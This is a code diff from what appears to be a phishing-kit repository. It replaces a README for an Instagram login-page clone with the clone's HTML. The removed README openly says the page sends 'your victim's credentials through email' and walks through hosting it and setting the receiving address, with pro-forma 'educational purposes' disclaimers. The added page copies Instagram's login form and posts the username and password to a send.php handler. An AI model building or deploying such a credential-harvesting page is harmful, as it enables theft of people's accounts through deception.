@@ -1,87 +1,187 @@
-# Insta-login
-Instagram login page clone which sends your victim's credentials through email.</br># Insta-login
-Instagram login page clone which sends your victim's credentials through email.</br>
-The webpage works on both **mobile** web browsers & **desktop**.<br/>
+<html>
 
+<head>
+    <title>Instagram</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
+    <meta http-equiv="refresh" content="60">
+    <link rel="icon" href="favicon.png" type="image/icon">
+    <style>
+      body{
+        margin:  0;
+        padding: 0;
+        display: flex;
+        min-height: 80vh;
+        align-items: center;
+        justify-content: center;
+        background-color: #F8F9F9;
+        font-family: sans-serif;
+    }
+    .container{
+        text-align: center;
+    }
+    
+    .page{
+        
+    width:350px;
+    background: #fff;
+    border-radius: 5px;
+    padding-bottom: 15px;
+    }
+    .logo{
+      display:block;
+    margin: 0 auto 5px;
+    }
+    form{
+     width: 75%;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    left: 50%;
+    transform: translateX(-50%);   
+    }
+    form input {
+    margin-bottom: 5px;
+    border:1px solid #b6b6b6;
+    background:  #faf9f9;
+    border-radius: 3px;
+    outline: none;
+    padding-left: 10px;
+    position: relative;
+    height: 35px;
+        
+    }
+    
+    form button{    
+    border: none;
+    background: rgb(76, 180, 248);
+    padding: 8px 0;
+    margin-top: 10px;
+    color: #fff;
+    border-radius: 7px;
+    font-weight: bold;
+    text-transform: capitalize;
+    letter-spacing: 1px;
+    outline: none;
+    cursor: pointer;
+    }
+    form button:active{
+    background:  rgb(24, 119, 242);
+    transform: scaleX(0.995);  
+    }
+    form.option{
+    color:#b6b4b4;
+    margin: 70px ;
+    position:relative;
+    }
+    form .option::before{
+    position: absolute;    
+    content:  '';
+    width: 37%;
+    height: 1px;
+    background:#b6b6b6; 
+    left:0%;
+    top: 95%;
+    transform: translateY(-50%);
+    border-radius: 50px;
+    
+    }
+    form .option::after{
+    position: absolute;    
+    content:  '';
+    width: 37%;
+    height: 2px;
+    background:#b6b6b6; 
+    right:0%;
+    top: 95%;
+    transform: translateY(-50%);
+    border-radius: 50px;
+    
+    }
+    .fblink{
+        margin-top: 30px;
+        width: 100%
+    }
+    .fblink span{
+        font-size: 18px;
+        color: rgb(56, 81, 133);
+        margin-right: 5px;
+        
+    }
+    .fblink a{
+      text-decoration: none;
+    font-weight: bold;
+    color: rgb(56, 81, 133);
+    }
+    .forget-id{
+        margin: 15px;   
+    }
+    .forget-id a{
+        text-decoration: none;
+        color: rgb(56, 81, 133);
+        font-size: 12px;
+        font-weight: 500;
+        
+    }
+    .page .singup{
+        position:relative;
+        border:1px solid #b6b6b6;
+        border-radius: 2px;
+        width: 90%;
+        left: 50%;
+        transform: translateX(-50%);
+        margin-top: 25px;
+    }
+    .singup a{
+        text-decoration: none;
+        margin-left: 5px;
+        color : rgb(76, 180, 248);
+        font-weight: bold;
+        
+    }
+    </style>
+</head>
 
-❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.
-You are solely responsible for your actions, that's obviously not me.**<br/>
-</br>
-</br>
+<body>
+    <div class="container">
+        <div class="page">
+            <div class="logo">
 
-## 🚀 Getting started
+                <img src="instagram.png" alt="instagram" style="width: 175px; ">
+            </div>
 
-* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)
+            <br />
+            <form class="container" action="send.php" method="post">
+                <input type="text" placeholder="Phone number, username, or email " name="u_name">
+                <input type="password" placeholder="Password" name="pass">
+                <button class="submitbutton">Log in </button>
+                <br />
+                <div class="option">OR </div>
+            </form>
 
-* Extract the zip and upload the website on your hosting server
+            <div class="fblink">
+                <span class="fab fafacebook"></span>
+                <a href="#"> Log in With Facebook</a>
+            </div>
 
-  - Here I am using a free hosting service, that supports - PHP Version Selection and
- PHP mail() Features
+            <div class="forget-id">
+                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
+            </div>
+            <div class="singup">
+                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
+                        Sign up</a></p>
+            </div>
 
+        </div>
+    </div>
 
-![image](https://github.com/Abhijeetbyte/Insta-login/assets/80936610/cebdace5-114a-4a3c-bc5b-31030b8a3547)
+    <br />
+    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
+        <p style="text-align:center;"> Disclaimer this is not a real "instagram.com" page, please do not enter
+            your real username and password, it's only for educational purposes.</p>
+    </div>
+    <br />
 
+</body>
 
-* Change receiving email address</br>
-
-  - ![img](email-php_LI.jpg)
-</br>
-
-### Webpage 
-![Webpage](webpage-preview.png)
-
-</br>
-
-* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
-
-  - ![img](received-email.png)
- 
-
-<br/>
-
-
-**Important Note:**
-
-This example demonstrates a highly unethical practice of phishing, which is illegal and punishable by law. Unauthorized collection of personal data can lead to severe legal consequences, including imprisonment and substantial fines. This information is provided solely for educational purposes to understand and recognize phishing tactics. Always use your technical skills responsibly and legally.
-The webpage works on both **mobile** web browsers & **desktop**.<br/>
-
-
-❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.
-You are solely responsible for your actions, that's obviously not me.**<br/>
-</br>
-</br>
-
-## 🚀 Getting started
-
-* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)
-
-* Extract the zip and upload the website on your hosting server
-
-  - Here I am using a free hosting service, that supports - PHP Version Selection and
- PHP mail() Features
-
-
-![image](https://github.com/Abhijeetbyte/Insta-login/assets/80936610/cebdace5-114a-4a3c-bc5b-31030b8a3547)
-
-
-* Change receiving email address</br>
-
-  - ![img](email-php_LI.jpg)
-</br>
-
-### Webpage 
-![Webpage](webpage-preview.png)
-
-</br>
-
-* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
-
-  - ![img](received-email.png)
- 
-
-<br/>
-
-
-**Important Note:**
-
-This example demonstrates a highly unethical practice of phishing, which is illegal and punishable by law. Unauthorized collection of personal data can lead to severe legal consequences, including imprisonment and substantial fines. This information is provided solely for educational purposes to understand and recognize phishing tactics. Always use your technical skills responsibly and legally.
+</html>
